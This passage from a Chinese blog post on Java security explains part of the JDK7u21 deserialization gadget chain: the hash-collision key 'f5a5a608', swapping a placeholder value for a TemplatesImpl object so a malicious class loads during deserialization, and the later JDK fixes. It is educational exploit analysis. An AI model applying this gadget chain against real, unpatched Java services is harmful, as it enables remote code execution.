</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span></code></pre></div><p><code>&quot;f5a5a608&quot;</code>和<code>&quot;&quot;</code>的作用类似，他们调用<code>hashCode</code>方法的值都为0</p>
<p>这里先放入无效值<code>&quot;Override&quot;</code></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashMap</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Override&#34;</span><span style="color:#56b6c2">);</span>
</span></span></code></pre></div><p>是为了不让程序运行到<code>set.add</code>时，走进<code>TemplatesImpl.newTransformer()</code>流程，导致序列化失败</p>
<p>而后面放入<code>templatesImpl</code></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span></code></pre></div><p>则是为了覆盖原先占位的<code>&quot;Override&quot;</code>，让其在反序列化时进入<code>TemplatesImpl.newTransformer()</code>来加载恶意类，进行命令执行</p>
<h3 id="高版本修复">高版本修复</h3>
<p><a class="link" href="https://hg.openjdk.org/jdk7u/jdk7u/jdk/file/2a444d8e36eb/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java"  target="_blank" rel="noopener"
    >JDK7u25-b03(2013-06-18)修补方案</a></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#7f848e">//JDK7u21
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">readObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">throws</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">defaultReadObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Check to make sure that types have not evolved incompatibly
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">AnnotationType</span> <span style="color:#e06c75">annotationType</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">annotationType</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">AnnotationType</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">IllegalArgumentException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#7f848e">// Class is no longer an annotation type; all bets are off
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#c678dd">return</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">//JDK7u25
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">readObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">throws</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">defaultReadObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Check to make sure that types have not evolved incompatibly
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">AnnotationType</span> <span style="color:#e06c75">annotationType</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">annotationType</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">AnnotationType</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">IllegalArgumentException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#7f848e">// Class is no longer an annotation type; time to punch out
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">InvalidObjectException</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;Non-annotation type in annotation serial stream&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>可以看到新版本直接抛出异常，而不是正常返回<code>null</code></p>
<p>还有一处修复</p>
<p><a class="link" href="https://hg.openjdk.org/jdk7u/jdk7u/jdk/file/5cf343beab2c/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java"  target="_blank" rel="noopener"
    >JDK7u71-b04</a></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#e06c75">AnnotationInvocationHandler</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">Annotation</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">type</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Map</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;[]</span> <span style="color:#e06c75">superInterfaces</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">type</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getInterfaces</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">type</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isAnnotation</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">||</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">superInterfaces</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">1</span> <span style="color:#56b6c2">||</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">superInterfaces</span><span style="color:#56b6c2">[</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">lang</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">annotation</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Annotation</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">AnnotationFormatError</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;Attempt to create proxy for a non-annotation type.&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">type</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">memberValues</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>这两处限制了type的类型必须为注释类，否则报错</p>
<p>本文原载于<a class="link" href="https://0zhanya.github.io/"  target="_blank" rel="noopener"
    >0ZHan&rsquo;s Blog</a>，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/java%E5%AE%89%E5%85%A8/">Java安全</a>
        
    </section>


    </footer>


    
</article>

    

    

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://npm.elemecdn.com/@waline/emojis@1.1.0/bmoji"],"lang":"zh-CN","locale":{"admin":"站长","sofa":"还没有人评论哦！快来抢沙发吧~"},"placeholder":"欢迎留下宝贵的评论！","requiredMeta":["name","email","url"],"serverURL":"https://data-table-e038f1l82-0zhanya.vercel.app/"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2024 0ZHan&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
